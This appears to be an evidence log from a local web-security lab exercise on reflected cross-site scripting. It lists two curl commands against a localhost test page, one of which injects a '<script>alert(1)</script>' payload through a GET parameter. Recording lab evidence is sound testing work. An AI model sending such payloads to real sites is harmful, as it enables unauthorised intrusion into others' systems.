Exploit: XSS Reflected (GET) - xss_get
Date: '"$(date -u)"'
Notes: Saved authenticated page and a safe test-payload rendering. Cookies were NOT saved in evidence.
Captured commands:
curl --cookie "PHPSESSID=..." "http://localhost:8080/xss_get.php" -o xss_reflected_raw.html
curl -G --cookie "PHPSESSID=..." --data-urlencode "name=<script>alert(1)</script>" "http://localhost:8080/xss_get.php" -o xss_test_payload.html
